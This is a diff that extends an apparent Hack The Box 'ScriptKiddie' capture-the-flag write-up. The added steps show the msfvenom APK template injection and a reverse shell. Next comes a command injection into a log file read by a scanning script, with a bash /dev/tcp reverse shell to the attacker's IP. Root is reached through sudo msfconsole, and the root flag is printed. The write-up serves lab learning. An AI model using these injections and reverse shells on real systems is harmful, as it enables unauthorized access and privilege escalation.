@@ -46,7 +46,7 @@ After editing /etc/host let's see a web page on skriptkiddie.htb:5000
 
 ![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/Web%20page.PNG)
 
-Foothold
+Foothold/User 1
 ---
 There are three options available
 Nmap, msfvenom and searchsploit are executed on the server and we can see the result
@@ -119,5 +119,190 @@ msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > e
 
 [+] msf.apk stored at /root/.msf4/local/msf.apk
 ```
-Now we can load our payload as template
+Now we can load our payload as template to get nc back connect  
 ![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/apk.PNG)
+
+```
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > use /multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.6
+LHOST => 10.10.14.6
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.6:4444 
+[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.10.226:41092) at 2021-02-13 12:05:51 -0500
+
+ls
+__pycache__
+app.py
+static
+templates
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+kid@scriptkiddie:~/html$ ls
+ls
+__pycache__  app.py  static  templates
+```
+And we got first user Kid
+
+Privilege escalation
+---
+Let's explore the home directory of Kid
+
+```
+kid@scriptkiddie:~/html$ cd /home
+cd /home
+kid@scriptkiddie:/home$ ls
+ls
+kid  pwn
+kid@scriptkiddie:/home$ cd kid
+cd kid
+kid@scriptkiddie:~$ ls
+ls
+html  logs  snap  user.txt
+kid@scriptkiddie:~$ ls -a
+ls -a
+.              .bashrc  .local    .sudo_as_admin_successful  user.txt
+..             .bundle  .msf4     html
+.bash_history  .cache   .profile  logs
+.bash_logout   .gnupg   .ssh      snap
+```
+There is app.py file in html folder. We can see searchsploit function in it
+```
+def searchsploit(text, srcip):                                                                                                                                                              
+    if regex_alphanum.match(text):                                                                                                                                                          
+        result = subprocess.check_output(['searchsploit', '--color', text])                                                                                                                 
+        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))                                                                                                 
+    else:                                                                                                                                                                                   
+        with open('/home/kid/logs/hackers', 'a') as f:
+            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
+        return render_template('index.html', sserror="stop hacking me - well hack you back")
+```
+If we'll try to run it with text in search field it will run searchsploit tool, else the server will write IP address and date-time information into /home/kid/logs/hackers file
+
+The hackers file is empty 
+```
+kid@scriptkiddie:~/logs$ ls   
+ls
+hackers
+kid@scriptkiddie:~/logs$ cat hackers
+cat hackers
+```
+Searching for something to use for privilege escalation i found the script 'scanlosers.sh' in a pwn user home directory
+```
+kid@scriptkiddie:~/logs$ cd /home/pwn
+cd /home/pwn
+kid@scriptkiddie:/home/pwn$ ls
+ls
+recon  scanlosers.sh
+```
+The script contains the following commands
+```
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+```
+As we can see it takes ip address (or everything after the second space) and tries to run nmap to scan it and then clears the file
+I copied the script on my local system to explore it
+
+Let's see what information the script gets from the file
+```
+┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
+└─# echo '123 456 789 123' > logs
+                                                                                                                                                                                            
+┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
+└─# cat logs | cut -d' ' -f3-
+789 123
+```
+It takes everything after the second space and puts this in the ip variable
+We can inject something after the second space to try to escalete privileges
+Lets test it
+```
+┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
+└─# echo '1 1 ;ls;' > logs   
+                                                                                                                                                                                            
+┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
+└─# ./scanlosers.sh
+                                                                                                                                                                                            
+Failed to open normal output file recon/ for writing
+QUITTING!
+logs  recon  scanlosers.sh
+sh: 1: .nmap: not found
+logs  recon  scanlosers.sh
+```
+As we can see it run the 'ls' comand
+Let's try it on the victim server
+```
+kid@scriptkiddie:~/logs$ echo '1 1 ;touch /home/kid/logs/hello;' > hackers
+echo '1 1 ;touch /home/kid/logs/hello;' > hackers
+kid@scriptkiddie:~/logs$ ls
+ls
+hackers  hello
+```
+And it works
+
+Now we can inject reverse-shell command after the seccond space for privilege escalation
+```
+kid@scriptkiddie:~/logs$ echo "1 1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1';" > hackers
+```
+And on the Kali side
+```
+┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/ssh]
+└─# nc -lvp 4444                                                                                                                                                                      130 ⨯
+listening on [any] 4444 ...
+connect to [10.10.14.6] from scriptkiddie.htb [10.10.10.226] 50500
+bash: cannot set terminal process group (866): Inappropriate ioctl for device
+bash: no job control in this shell
+pwn@scriptkiddie:~$
+```
+And we got the second user
+
+root
+-----
+Let's use (sudo -l) command to see if we can run something with super user rights
+```
+pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+```
+And that's it, we can run msfconsole as a super user
+```
+pwn@scriptkiddie:~$ sudo msfconsole
+sudo msfconsole
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v6.0.9-dev                           ]
++ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Use help <command> to learn more about any command
+
+
+msf6 > cat /root/root.txt
+[*] exec: cat /root/root.txt
+
+f8896c6c014df77b4d000c7b69a136d3
+```
+Using msfconsole we can execute every command with super user rights, in this case we read the root.txt file from root folder
